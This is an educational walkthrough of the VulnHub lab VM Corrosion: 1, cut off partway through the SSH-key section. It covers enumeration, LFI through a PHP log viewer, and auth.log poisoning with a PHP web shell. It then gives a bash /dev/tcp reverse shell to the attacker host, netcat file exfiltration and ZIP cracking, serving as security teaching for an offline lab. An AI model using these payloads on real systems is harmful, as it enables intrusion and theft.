# Corrosion: 1 (VulnHub) β€” A Beginner-Friendly Walkthrough

| Field | Value |
|---|---|
| **Machine** | Corrosion: 1 |
| **Difficulty** | Easy |
| **Author** | Proxy Programmer |
| **Released** | 31 July 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/corrosion-1,730/ |
| **Download** | https://download.vulnhub.com/corrosion/Corrosion.ova |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, Apache/2.4.46) |
| **Author Hint** | "Enumerate Property." β€” enumeration is the whole game here |

> **Note on the network:** every command below assumes the Kali attacker is
> `192.168.56.10` and the Corrosion VM is `192.168.56.101`. Substitute your own
> IPs if your host-only network uses a different range. Corrosion ships as an
> `.ova`; import it into VirtualBox/VMware and put both VMs on the same
> host-only network so they can see each other.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this walkthrough you will have practised, on a real (but safe,
offline) target:

1. **Host discovery** β€” finding the target VM's IP address on your local network.
2. **Port & service scanning** β€” running `nmap` to see what is listening.
3. **Web directory enumeration** β€” using `gobuster`/`dirb` to find hidden pages.
4. **Parameter fuzzing** β€” using `wfuzz`/`ffuf` to discover a hidden URL parameter.
5. **Local File Inclusion (LFI)** β€” reading arbitrary files through a broken PHP page.
6. **Log poisoning** β€” turning a file-read bug into remote code execution (RCE)
   by writing PHP into `/var/log/auth.log` through failed SSH logins.
7. **Reverse shells** β€” catching an interactive `www-data` shell with `nc`.
8. **Password cracking** β€” extracting an encrypted ZIP and cracking it with `john`.
9. **Lateral movement** β€” pivoting from `www-data` to the user `randy`.
10. **Privilege escalation** β€” abusing a `sudo`-allowed helper binary to become `root`.

It is aimed at someone who has never finished a CTF box before. Take it slowly;
read every "Why it works" note.

> **The intended chain in one breath:** nmap shows SSH + HTTP β†’ gobuster finds
> a task list and a PHP log viewer β†’ the PHP page has an `file` parameter that is
> a Local File Inclusion β†’ the task list tells us the auth log has bad
> permissions β†’ we poison the auth log via SSH usernames to get RCE β†’ `www-data`
> shell β†’ find an encrypted backup ZIP β†’ crack it β†’ get `randy`'s password and
> his passwordless `sudo` helper β†’ replace the helper with our own binary β†’ root.

---

## 1. Reconnaissance β€” finding the target

First we need the target's IP address. If you already set the VM's network
adapter to a host-only network, the address is usually the same each boot, but
let's confirm it.

### 1.1 Identify your own IP

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` prints every network interface and its assigned IP.
> Our attacker is `192.168.56.10/24`, so the `/24` tells us the whole subnet is
> `192.168.56.0β€“255`. The target must be somewhere in that range.

### 1.2 Sweep the subnet for the target


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    08:00:27:xx:xx:xx   PCS Systemtechnik GmbH   (VirtualBox host)
192.168.56.10   08:00:27:aa:aa:aa   PCS Systemtechnik GmbH   (our Kali)
192.168.56.101  08:00:27:bb:bb:bb   PCS Systemtechnik GmbH   <-- target
```

Alternatively, with `netdiscover`:

```bash
sudo netdiscover -r 192.168.56.0/24
```

> **Why it works:** both tools send ARP requests ("who has this IP?") across the
> local subnet and list everyone who answers. ARP only works on your own local
> network, which is exactly where our lab VMs live. The VirtualBox NIC prefix
> `08:00:27` confirms the answer is a VM.

![Finding the target IP](images/01-arp-scan.png)

**Target confirmed: `192.168.56.101`.**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration β€” open ports and services

Enumeration is the hint for this box, so we spend real effort here.

### 2.1 Full TCP port scan with service detection


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- -oN corrosion.nmap 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:**
> - `-p-` scans **all** 65535 ports, not just the common 1000. Always do this on
>   CTFs β€” services hide on high ports.
> - `-sV` fingerprints the version behind each open port.
> - `-sC` runs Nmap's default "safe" scripts, which often reveal titles, headers,
>   and minor misconfigurations for free.
> - `-oN corrosion.nmap` saves the output so you can grep it later without
>   re-scanning.

Only two services matter: **SSH (22)** and **HTTP (80)**. Some writeups mention
an extra web port on other builds, but on the stock Corrosion VM the classic
path is 22 + 80. (If your scan shows `8080`, enumerate it the same way β€” it is
not required for the intended chain.)

### 2.2 Look at the web server

```bash
curl -s http://192.168.56.101/ | head
```

```text
<title>Apache2 Ubuntu Default Page: It works</title>
```

The landing page is the boring default Apache page β€” nothing to click. On CTFs
that almost always means the good stuff is in a **directory we haven't guessed**.
So we enumerate directories.

### 2.3 Directory busting with gobuster


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
gobuster dir -u http://192.168.56.101 -x php,html,txt \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -o gobuster-root.log
```

```text
/blog-post            (Status: 301) [Size: 316]
/tasks                (Status: 301) [Size: 306]
/backups              (Status: 301) [Size: 312]
/index.html           (Status: 200) [Size: 10918]
```

> **Why it works:** `gobuster dir` requests `http://target/<word>` for every word
> in the wordlist and reports the ones that don't return "404 Not Found". A
> `301` (Moved Permanently) tells us a directory exists but needs a trailing
> slash. The `-x php,html,txt` flag also tries each word with those extensions
> appended.

Two interesting hits: `/tasks` and `/blog-post`. Let's walk both.

### 2.4 The task list β€” a giant hint

```bash
curl -s http://192.168.56.101/tasks/
```

```text
Index of /tasks
[ ] tasks_todo.txt
```

```bash
curl -s http://192.168.56.101/tasks/tasks_todo.txt
```

```text
1. Change permissions for auth log
2. Change port 22 -> 7672
3. Set up phpMyAdmin
```

> **Why it works:** directory listing is enabled, so Apache shows the files.
> This `tasks_todo.txt` is the author's roadmap for the attack:
> - **"Change permissions for auth log"** β†’ the `/var/log/auth.log` file is
>   world-readable, which is *abnormal* and a huge hint toward log poisoning.
> - **"Change port 22 β†’ 7672"** β†’ SSH is *still* on 22, so we can still log in
>   (and still poison logs) there.
> - **"Set up phpMyAdmin"** β†’ not done yet, ignore it. Classic rabbit hole.

### 2.5 The blog and its archives

```bash
gobuster dir -u http://192.168.56.101/blog-post -x php,html,txt \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -o gobuster-blog.log
```

```text
/uploads     (Status: 301)
/archives    (Status: 301)
/icons       (Status: 301)
```

Browse the archive directory:

```bash
curl -s http://192.168.56.101/blog-post/archives/
```

```text
Index of /blog-post/archives
[ ] randylogs.php
```

> **Why it works:** this looks like a half-finished "blog" CMS. The page
> `/blog-post/` shows a user named **randy**, and `archives/` contains a single
> PHP file, `randylogs.php`. The name ("randy logs") plus the task list point
> straight at it.

Fetching `randylogs.php` directly returns an **empty** body:

```bash
curl -s -i http://192.168.56.101/blog-post/archives/randylogs.php
```

```text
HTTP/1.1 200 OK
Content-Length: 0
```

> **Why it works:** a PHP file that returns an empty body but a `200 OK` means
> the code ran β€” it just didn't print anything because it expected an input we
> haven't supplied. That input is a URL parameter, and we need to guess its name.

![Directory busting results](images/02-gobuster.png)

---

## 3. Foothold β€” gaining the first shell

### 3.1 Discover the hidden parameter with fuzzing

We know `randylogs.php` reads *something*. Let's brute-force the parameter name.
The `FUZZ` keyword is replaced by each word in the wordlist.

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  --hl 0 \
  -u "http://192.168.56.101/blog-post/archives/randylogs.php?FUZZ=/etc/passwd"
```

Or with `ffuf`:

```bash
ffuf -u "http://192.168.56.101/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt -fs 0
```

```text
file                    [Status: 200, Size: 1337]
```

> **Why it works:**
> - `--hl 0` (wfuzz) / `-fs 0` (ffuf) **hide every response of length 0**. Most
>   wrong parameter names make the script print nothing, so by hiding those we
>   surface the handful of responses that actually returned data.
> - The winner is a parameter literally called **`file`**. That is a giant red
>   flag: a PHP script that includes a file the user names.

### 3.2 Confirm the Local File Inclusion (LFI)


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
...
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
```

> **Why it works:** the page echoed the whole of `/etc/passwd`. That is a
> textbook **Local File Inclusion** β€” the script does something like
> `include($_GET['file'])`, so we can read any file the web server user
> (`www-data`) is allowed to read. We also learn a real account exists:
> **`randy`**.

Now read the auth log the task list pointed us at:

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log" | tail
```

```text
Jul 31 10:00:01 corrosion CRON[1201]: pam_unix(cron:session): session opened for user root
```

> **Why it works:** `auth.log` is normally root-only, but the misconfiguration
> flagged in `tasks_todo.txt` left it **world-readable** (recall the root crontab
> runs `chmod 775 -R /var/log/auth.log` every minute). Because our LFI can read
> it, and because PHP will happily **execute** PHP code it finds inside an
> included file, we can turn read-access into code execution.

### 3.3 Log poisoning β€” writing PHP into the log

Every failed SSH login records the **username** we tried. If our username is PHP
code, that code ends up inside `auth.log`. The `randylogs.php` script then
includes the log β€” and executes our code.

First, prove we can write to the log with a harmless name:

```bash
ssh write_test@192.168.56.101
```

```text
write_test@192.168.56.101's password:
Permission denied, please try again.
```

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log" | grep write_test
```

```text
Jul 31 10:05:11 corrosion sshd[1500]: Invalid user write_test from 192.168.56.10
Jul 31 10:05:13 corrosion sshd[1500]: Failed password for invalid user write_test
```

> **Why it works:** SSH logs *who* tried to connect, even for made-up users, and
> this log is SSH-reachable on port 22. We control the username string, so we
> control what gets written into the file.

Now poison the log with a PHP web shell as the username:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@192.168.56.101
```

```text
<?php system($_GET["cmd"]); ?>@192.168.56.101's password:
Permission denied, please try again.
```

> **Why it works:** the username is now `<?php system($_GET["cmd"]); ?>`, so that
> exact text sits inside `auth.log`. When `randylogs.php` includes the log and
> PHP processes it, the `<?php ... ?>` block runs. `system()` executes whatever is
> in the `cmd` GET parameter. **Note:** in `auth.log` this string is truncated to
> the first space, so keep the payload compact.

Test code execution:

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** we never saw the literal `<?php ... ?>` text back β€” we saw
> the *output of `id`* instead. That proves the server executed our injected PHP.
> We now have **Remote Code Execution** as `www-data`.

![LFI confirmed reading /etc/passwd](images/03-lfi-passwd.png)

### 3.4 Catch a reverse shell

Start a listener on Kali:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -nlvp 9001
```

In another terminal, trigger a Bash reverse shell through the web shell. URL-encode
the payload so the spaces and special characters survive:

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.56.10/9001%200%3E%261%27"
```

Back in the `nc` window:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 57712
www-data@corrosion:/var/www/html/blog-post/archives$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** `/dev/tcp/<ip>/<port>` is a Bash-only pseudo-device: opening
> it makes Bash connect out to our listener, and `0>&1` wires stdin/stdout/stderr
> to that socket. We have a full interactive shell as `www-data`.

Optionally upgrade to a stable TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** this asks Python to give us a real pseudo-terminal, so tools
> like `sudo` and text editors behave normally instead of complaining about a
> "dumb terminal".

![Reverse shell as www-data](images/04-reverse-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation β€” becoming root

### 4.1 Enumerate the filesystem as www-data

```bash
ls -la /home
ls -la /var/backups
```

```text
total 12
... randy/          <-- only real user

total 24
-rw-r--r-- 1 root root  1784 ... user_backup.zip   <-- readable by everyone!
```

> **Why it works:** `/var/backups/user_backup.zip` is **world-readable**. A
> password-protected ZIP named "user backup" is exactly the kind of thing an
> admin leaks. We can read the file even as the low-privileged web user.

### 4.2 Copy the ZIP to Kali

Serve it from the target over HTTP:

```bash
cd /var/backups
python3 -m http.server 8000
```

Then on Kali:

```bash
wget http://192.168.56.101:8000/user_backup.zip
```

(No `curl`/`wget` on the target? Push it with netcat instead:

```bash
# on Kali
nc -lvnp 1111 > user_backup.zip
# on target
cat user_backup.zip > /dev/tcp/192.168.56.10/1111
```

)

> **Why it works:** plain HTTP or netcat both move raw bytes; either way we now
> have the encrypted archive locally where we can crack it with better hardware.

### 4.3 Crack the ZIP password

Convert the ZIP to a crackable hash and feed it to John the Ripper:


> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
zip2john user_backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
john --show zip.hash
```

```text
user_backup.zip:!randybaby
```

(`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt user_backup.zip` works too.)

> **Why it works:** `zip2john` extracts the ZIP's password verifier into a format
> John understands; John then tries every password in `rockyou.txt` until the
> verifier matches. The password is weak, so it falls in under a second.

### 4.4 Extract and pivot to randy

```bash
unzip user_backup.zip -d backup
ls backup
```


> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
